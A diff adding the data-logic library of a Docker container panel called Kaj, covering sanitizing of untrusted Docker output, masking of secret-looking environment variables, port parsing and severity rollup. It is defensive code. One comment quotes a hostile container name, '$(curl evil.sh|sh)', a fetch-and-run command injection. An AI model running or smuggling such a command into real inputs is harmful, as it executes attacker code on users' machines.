@@ -1,0 +1,505 @@
+.pragma library
+
+// Pure data logic for Kaj. Nothing here touches QML, Quickshell, or the
+// filesystem, so every function below is exercised by test/model.test.js under
+// plain node. The rule this file exists to enforce: anything that comes back
+// from the Docker daemon is untrusted input, and it gets normalized here once
+// rather than being sprinkled through the UI.
+
+// ---------------------------------------------------------------------------
+// Untrusted text
+// ---------------------------------------------------------------------------
+
+// Container names, image tags, labels, and above all log lines are written by
+// whoever built the image, not by the user running it. Two rules follow, and
+// both are enforced here rather than left to each call site:
+//
+//   1. This text is never concatenated into a shell string. Service.qml runs
+//      every command as an argv array, so a container literally named
+//      $(curl evil.sh|sh) is just eleven boring characters.
+//   2. This text is never handed to a rich-text renderer. QML's Text parses
+//      HTML when textFormat is RichText, which turns an <img src="file://...">
+//      in a log line into a local file read. The UI pins textFormat to
+//      PlainText; sanitize() additionally strips the control bytes that would
+//      otherwise let a log line repaint the panel.
+
+// CSI sequences (ESC [ ... final), OSC strings (ESC ] ... BEL/ST), the short
+// two-byte escapes, and the 8-bit CSI. Written with explicit hex escapes and
+// never literal control bytes: a raw ESC or NUL in the source is invisible in
+// a diff and makes grep treat the file as binary, which is exactly the wrong
+// property for the code that sanitizes untrusted input.
+var ansiPattern = /\x1b\[[0-9;?]*[ -\/]*[@-~]|\x1b\][^\x07\x1b]*(?:\x07|\x1b\\)|\x1b[@-Z\\-_]|\x9b[0-9;?]*[ -\/]*[@-~]/g
+// C0 controls except tab and newline, plus DEL and the C1 range.
+var controlPattern = /[\x00-\x08\x0b-\x1f\x7f-\x9f]/g
+
+function stripAnsi(text) {
+  return String(text === undefined || text === null ? "" : text).replace(ansiPattern, "")
+}
+
+// Full cleanup for anything that will be shown to a human: drop escape
+// sequences first, then any remaining control bytes, then cap the length so one
+// pathological line cannot stall the renderer.
+function sanitize(text, maxLength) {
+  var limit = maxLength === undefined ? 4096 : maxLength
+  var out = stripAnsi(text).replace(controlPattern, "")
+  if (out.length > limit) out = out.slice(0, limit) + "…"
+  return out
+}
+
+// Single-line variant, for names and status strings that must not wrap.
+function sanitizeLine(text, maxLength) {
+  return sanitize(String(text === undefined || text === null ? "" : text).replace(/[\r\n\t]+/g, " "), maxLength === undefined ? 256 : maxLength)
+}
+
+// ---------------------------------------------------------------------------
+// Secrets
+// ---------------------------------------------------------------------------
+
+// Container environment is where people keep database passwords and API keys.
+// A panel that renders them by default leaks them to anyone glancing at the
+// screen, and to every screenshot and screen recording. Kaj masks first and
+// reveals only on an explicit click, so the default state is the safe one.
+var secretKeyPattern = /(PASS|PASSWD|PASSWORD|SECRET|TOKEN|APIKEY|API_KEY|ACCESS_KEY|PRIVATE_KEY|CREDENTIAL|AUTH|SESSION|COOKIE|SALT|CIPHER|SIGNING|WEBHOOK|DSN|CONNECTION_STRING)/i
+// Values that look like secrets even under an innocent key name.
+var secretValuePattern = /^(eyJ[A-Za-z0-9_-]{10,}|gh[pousr]_[A-Za-z0-9]{16,}|sk-[A-Za-z0-9_-]{16,}|xox[baprs]-[A-Za-z0-9-]{10,}|AKIA[0-9A-Z]{12,})/
+
+function isSensitiveEnvKey(key) {
+  return secretKeyPattern.test(String(key || ""))
+}
+
+function isSensitiveEnvValue(value) {
+  return secretValuePattern.test(String(value || ""))
+}
+
+// Split a raw "KEY=value" entry as Docker reports it. Only the first "=" is a
+// separator; values routinely contain more.
+function splitEnvEntry(entry) {
+  var text = String(entry === undefined || entry === null ? "" : entry)
+  var index = text.indexOf("=")
+  if (index < 0) return { key: sanitizeLine(text), value: "" }
+  return { key: sanitizeLine(text.slice(0, index)), value: text.slice(index + 1) }
+}
+
+// Returns a display record. `masked` is what the UI shows until the user asks
+// to reveal; `value` stays available for the copy action but is never rendered
+// while masked is true.
+function envEntry(entry) {
+  var parts = splitEnvEntry(entry)
+  var sensitive = isSensitiveEnvKey(parts.key) || isSensitiveEnvValue(parts.value)
+  return {
+    key: parts.key,
+    value: sanitizeLine(parts.value, 512),
+    sensitive: sensitive,
+    masked: sensitive ? maskValue(parts.value) : sanitizeLine(parts.value, 512)
+  }
+}
+
+// Keep a hint of length so "is it set at all?" is answerable without revealing.
+function maskValue(value) {
+  var text = String(value === undefined || value === null ? "" : value)
+  if (text === "") return ""
+  return "••••••••"
+}
+
+function envEntries(list) {
+  var out = []
+  if (!Array.isArray(list)) return out
+  for (var i = 0; i < list.length; i++) out.push(envEntry(list[i]))
+  return out
+}
+
+// ---------------------------------------------------------------------------
+// Parsing
+// ---------------------------------------------------------------------------
+
+// Docker emits one JSON object per line. A malformed line is skipped rather
+// than failing the whole refresh: a single unparseable container should not
+// blank the panel.
+//
+// Every line is stripped of escape sequences before parsing. This is not
+// belt-and-braces: `docker stats` writes real cursor-control codes around each
+// record even when its output is a pipe rather than a terminal, so a line
+// arrives as ESC[H{"CPUPerc":...}ESC[K and JSON.parse rejects all of it. The
+// same strip covers a log or event payload that carries escapes deliberately.
+function parseJsonLines(text) {
+  var out = []
+  var lines = stripAnsi(String(text === undefined || text === null ? "" : text)).split("\n")
+  for (var i = 0; i < lines.length; i++) {
+    var line = lines[i].replace(controlPattern, "").trim()
+    if (line === "") continue
+    try {
+      var parsed = JSON.parse(line)
+      if (parsed && typeof parsed === "object") out.push(parsed)
+    } catch (e) {
+      // Ignore: partial line from a stream, or output we do not understand.
+    }
+  }
+  return out
+}
+
+function shortId(id) {
+  return String(id || "").replace(/^sha256:/, "").slice(0, 12)
+}
+
+// Docker reports container names with a leading slash.
+function displayName(name) {
+  return sanitizeLine(String(name || "").replace(/^\//, ""))
+}
+
+// Health is only meaningful when the image declares a healthcheck; absent one,
+// "" means "no opinion" and must not be shown as unhealthy.
+function healthOf(state) {
+  if (!state || typeof state !== "object") return ""
+  var health = state.Health
+  if (!health || typeof health !== "object") return ""
+  return sanitizeLine(health.Status || "")
+}
+
+// One container, normalized from the inspect payload into the flat shape the
+// UI binds against.
+function normalizeContainer(raw) {
+  if (!raw || typeof raw !== "object") return null
+  var state = raw.State && typeof raw.State === "object" ? raw.State : {}
+  var labels = raw.Labels && typeof raw.Labels === "object" ? raw.Labels : {}
+  var status = sanitizeLine(state.Status || "unknown")
+
+  return {
+    id: String(raw.Id || ""),
+    shortId: shortId(raw.Id),
+    name: displayName(raw.Name),
+    image: sanitizeLine(raw.Image || ""),
+    status: status,
+    running: state.Running === true,
+    paused: state.Paused === true,
+    restarting: state.Restarting === true,
+    dead: state.Dead === true,
+    oomKilled: state.OOMKilled === true,
+    exitCode: Number(state.ExitCode || 0),
+    error: sanitizeLine(state.Error || "", 512),
+    health: healthOf(state),
+    restartCount: Number(raw.RestartCount || 0),
+    startedAt: parseTime(state.StartedAt),
+    finishedAt: parseTime(state.FinishedAt),
+    createdAt: parseTime(raw.Created),
+    project: sanitizeLine(labels["com.docker.compose.project"] || ""),
+    service: sanitizeLine(labels["com.docker.compose.service"] || ""),
+    ports: normalizePorts(raw.Ports)
+  }
+}
+
+function normalizeContainers(list) {
+  var out = []
+  if (!Array.isArray(list)) return out
+  for (var i = 0; i < list.length; i++) {
+    var item = normalizeContainer(list[i])
+    if (item && item.id !== "") out.push(item)
+  }
+  return out
+}
+
+// Docker's zero timestamp means "never"; return 0 so callers can test falsily.
+function parseTime(value) {
+  var text = String(value || "")
+  if (text === "" || text.indexOf("0001-01-01") === 0) return 0
+  var ms = Date.parse(text)
+  return isFinite(ms) ? ms : 0
+}
+
+// NetworkSettings.Ports maps "5800/tcp" to a list of host bindings, or to null
+// for an exposed-but-unpublished port.
+function normalizePorts(ports) {
+  var out = []
+  if (!ports || typeof ports !== "object") return out
+  var keys = Object.keys(ports).sort()
+  for (var i = 0; i < keys.length; i++) {
+    var bindings = ports[keys[i]]
+    var parts = String(keys[i]).split("/")
+    var containerPort = parseInt(parts[0], 10)
+    if (!isFinite(containerPort)) continue
+    if (!Array.isArray(bindings) || bindings.length === 0) {
+      out.push({ containerPort: containerPort, protocol: parts[1] || "tcp", hostIp: "", hostPort: 0, published: false })
+      continue
+    }
+    // Collapse the v4/v6 pair Docker reports for a single -p flag.
+    var seen = {}
+    for (var j = 0; j < bindings.length; j++) {
+      var hostPort = parseInt(bindings[j] && bindings[j].HostPort, 10)
+      if (!isFinite(hostPort) || seen[hostPort]) continue
+      seen[hostPort] = true
+      out.push({
+        containerPort: containerPort,
+        protocol: parts[1] || "tcp",
+        hostIp: sanitizeLine(bindings[j].HostIp || ""),
+        hostPort: hostPort,
+        published: true
+      })
+    }
+  }
+  return out
+}
+
+// Only a port actually bound on a loopback-reachable address is worth offering
+// as a clickable link. 0.0.0.0 and :: are reachable via localhost; a binding to
+// some other specific interface may not be, so it is shown but not linked.
+function browsableUrl(port) {
+  if (!port || !port.published || port.protocol !== "tcp") return ""
+  var host = port.hostIp
+  if (host !== "" && host !== "0.0.0.0" && host !== "::" && host !== "127.0.0.1" && host !== "localhost") return ""
+  var scheme = port.hostPort === 443 || port.hostPort === 8443 ? "https" : "http"
+  return scheme + "://localhost:" + port.hostPort
+}
+
+// ---------------------------------------------------------------------------
+// Stats
+// ---------------------------------------------------------------------------
+
+// `docker stats` reports preformatted strings ("3.49%", "74.71MiB / 7.628GiB").
+// Parse to numbers so the UI can sort and draw meters instead of printing them.
+function parsePercent(value) {
+  var n = parseFloat(String(value || "").replace("%", ""))
+  return isFinite(n) && n >= 0 ? n : 0
+}
+
+var unitFactors = { B: 1, KB: 1e3, MB: 1e6, GB: 1e9, TB: 1e12, KIB: 1024, MIB: 1048576, GIB: 1073741824, TIB: 1099511627776 }
+
+function parseSize(value) {
+  var match = String(value || "").trim().match(/^([0-9.]+)\s*([A-Za-z]+)?$/)
+  if (!match) return 0
+  var n = parseFloat(match[1])
+  if (!isFinite(n)) return 0
+  var factor = unitFactors[String(match[2] || "B").toUpperCase()]
+  return factor ? n * factor : 0
+}
+
+// "74.71MiB / 7.628GiB" -> { used, limit }
+function parseUsagePair(value) {
+  var parts = String(value || "").split("/")
+  return { used: parseSize(parts[0]), limit: parseSize(parts[1]) }
+}
+
+function normalizeStat(raw) {
+  if (!raw || typeof raw !== "object") return null
+  var id = String(raw.ID || raw.Container || "")
+  if (id === "") return null
+  var mem = parseUsagePair(raw.MemUsage)
+  return {
+    shortId: shortId(id),
+    cpu: parsePercent(raw.CPUPerc),
+    memPercent: parsePercent(raw.MemPerc),
+    memUsed: mem.used,
+    memLimit: mem.limit,
+    pids: parseInt(raw.PIDs, 10) || 0
+  }
+}
+
+// Stats arrive as a stream keyed by short id; fold them into a lookup the UI
+// can index by container.
+function mergeStats(existing, raw) {
+  var out = {}
+  if (existing && typeof existing === "object") {
+    var keys = Object.keys(existing)
+    for (var i = 0; i < keys.length; i++) out[keys[i]] = existing[keys[i]]
+  }
+  var stat = normalizeStat(raw)
+  if (stat) out[stat.shortId] = stat
+  return out
+}
+
+// ---------------------------------------------------------------------------
+// Grouping and rollup
+// ---------------------------------------------------------------------------
+
+// The list the panel actually renders. Hiding stopped containers is a display
+// choice only: the bar count and severity keep using the full list, because a
+// container that crashed is exactly the one a person needs to be told about,
+// and hiding it must not also hide the fact that it failed.
+function visibleContainers(containers, hideStopped) {
+  var list = Array.isArray(containers) ? containers : []
+  if (!hideStopped) return list
+  var out = []
+  for (var i = 0; i < list.length; i++) {
+    // A stopped container that failed still shows: "hide stopped" means "hide
+    // the boring ones", not "hide the evidence".
+    if (list[i].running || containerSeverity(list[i]) === "error") out.push(list[i])
+  }
+  return out
+}
+
+// Compose grouping is the organizing idea of the panel: people think in
+// projects ("my app"), not in a flat list of eleven containers. Standalone
+// containers collect under an empty project id and render last.
+function groupByProject(containers) {
+  var order = []
+  var groups = {}
+  var list = Array.isArray(containers) ? containers : []
+
+  for (var i = 0; i < list.length; i++) {
+    var key = list[i].project || ""
+    if (!groups[key]) {
+      groups[key] = { project: key, standalone: key === "", containers: [] }
+      order.push(key)
+    }
+    groups[key].containers.push(list[i])
+  }
+
+  order.sort(function (a, b) {
+    if (a === "") return 1
+    if (b === "") return -1
+    return a.localeCompare(b)
+  })
+
+  var out = []
+  for (var j = 0; j < order.length; j++) {
+    var group = groups[order[j]]
+    group.containers.sort(compareContainers)
+    group.running = countRunning(group.containers)
+    group.total = group.containers.length
+    group.severity = rollupSeverity(group.containers)
+    out.push(group)
+  }
+  return out
+}
+
+// Running first, then by compose service name so a project's containers keep a
+// stable order across refreshes rather than shuffling on every event.
+function compareContainers(a, b) {
+  if (a.running !== b.running) return a.running ? -1 : 1
+  var left = a.service || a.name
+  var right = b.service || b.name
+  return left.localeCompare(right)
+}
+
+function countRunning(containers) {
+  var n = 0
+  var list = Array.isArray(containers) ? containers : []
+  for (var i = 0; i < list.length; i++) if (list[i].running) n++
+  return n
+}
+
+// Severity drives the bar icon colour. "error" is reserved for states a person
+// would want to know about immediately without opening anything.
+function containerSeverity(container) {
+  if (!container) return "ok"
+  if (container.oomKilled) return "error"
+  if (container.dead) return "error"
+  if (container.health === "unhealthy") return "error"
+  if (!container.running && container.exitCode !== 0) return "error"
+  if (container.restarting) return "warn"
+  if (container.paused) return "warn"
+  if (container.health === "starting") return "warn"
+  return "ok"
+}
+
+var severityRank = { ok: 0, warn: 1, error: 2 }
+
+function rollupSeverity(containers) {
+  var worst = "ok"
+  var list = Array.isArray(containers) ? containers : []
+  for (var i = 0; i < list.length; i++) {
+    var severity = containerSeverity(list[i])
+    if (severityRank[severity] > severityRank[worst]) worst = severity
+  }
+  return worst
+}
+
+// ---------------------------------------------------------------------------
+// Formatting
+// ---------------------------------------------------------------------------
+
+function formatUptime(startedAtMs, nowMs) {
+  if (!startedAtMs) return ""
+  var seconds = Math.floor(((nowMs || Date.now()) - startedAtMs) / 1000)
+  if (seconds < 0) return ""
+  if (seconds < 60) return seconds + "s"
+  var minutes = Math.floor(seconds / 60)
+  if (minutes < 60) return minutes + "m"
+  var hours = Math.floor(minutes / 60)
+  if (hours < 24) return hours + "h " + (minutes % 60) + "m"
+  var days = Math.floor(hours / 24)
+  if (days < 7) return days + "d " + (hours % 24) + "h"
+  return days + "d"
+}
+
+function formatBytes(bytes) {
+  var n = Number(bytes)
+  if (!isFinite(n) || n <= 0) return "0 B"
+  var units = ["B", "KB", "MB", "GB", "TB"]
+  var index = 0
+  while (n >= 1000 && index < units.length - 1) {
+    n = n / 1000
+    index++
+  }
+  return (n >= 100 || index === 0 ? Math.round(n) : n.toFixed(1)) + " " + units[index]
+}
+
+function formatPercent(value) {
+  var n = Number(value)
+  if (!isFinite(n) || n < 0) return "0%"
+  return (n >= 10 ? Math.round(n) : n.toFixed(1)) + "%"
+}
+
+// The one-line summary under a container name. Prefers whatever a person most
+// needs to know: why it died, then health, then how long it has been up.
+function statusSummary(container, nowMs) {
+  if (!container) return ""
+  if (container.oomKilled) return "Out of memory"
+  if (container.restarting) return "Restarting" + (container.restartCount > 0 ? " ×" + container.restartCount : "")
+  if (container.paused) return "Paused"
+  if (container.dead) return "Dead"
+  if (!container.running) {
+    if (container.exitCode !== 0) return "Exited (" + container.exitCode + ")"
+    return "Stopped"
+  }
+  var uptime = formatUptime(container.startedAt, nowMs)
+  if (container.health === "unhealthy") return "Unhealthy" + (uptime ? " · up " + uptime : "")
+  if (container.health === "starting") return "Starting" + (uptime ? " · up " + uptime : "")
+  return uptime ? "Up " + uptime : "Running"
+}
+
+// Bar tooltip: one line, no per-container detail.
+function barSummary(containers) {
+  var list = Array.isArray(containers) ? containers : []
+  if (list.length === 0) return "No containers"
+  var running = countRunning(list)
+  return running + " of " + list.length + " running"
+}
+
+// ---------------------------------------------------------------------------
+// Actions
+// ---------------------------------------------------------------------------
+
+// Which actions apply to a container in its current state. Keeping this here
+// rather than in QML means the button set is testable, and means the UI cannot
+// offer "start" on something already running.
+function availableActions(container) {
+  if (!container) return []
+  if (container.running && !container.paused) return ["stop", "restart", "pause", "logs", "shell"]
+  if (container.paused) return ["unpause", "stop", "logs"]
+  return ["start", "remove", "logs"]
+}
+
+// The single gate every mutation passes through. Anything true here needs an
+// explicit confirmation naming what is destroyed; everything else is a plain
+// click. Kaj deliberately keeps this list short: friction on start/stop teaches
+// people to click through dialogs, which is how the destructive one gets
+// clicked through too.
+function isDestructive(action) {
+  return action === "remove" || action === "removeVolumes" || action === "prune" || action === "recreate"
+}
+
+// Human-readable consequence, shown in the confirm dialog. Never assembled from
+// container-controlled text without sanitizing first.
+function confirmText(action, container) {
+  var name = container ? container.name : "this container"
+  if (action === "remove") return "Remove " + name + "? The container is deleted. Named volumes are kept."
+  if (action === "removeVolumes") return "Remove " + name + " and its anonymous volumes? Data in those volumes is lost."
+  if (action === "recreate") return "Recreate " + name + "? The current container is replaced."
+  return "Continue?"
+}
+
+// Verb shown on the confirm button.
+function confirmVerb(action) {
+  if (action === "remove" || action === "removeVolumes") return "Remove"
+  if (action === "recreate") return "Recreate"
+  return "Continue"
+}
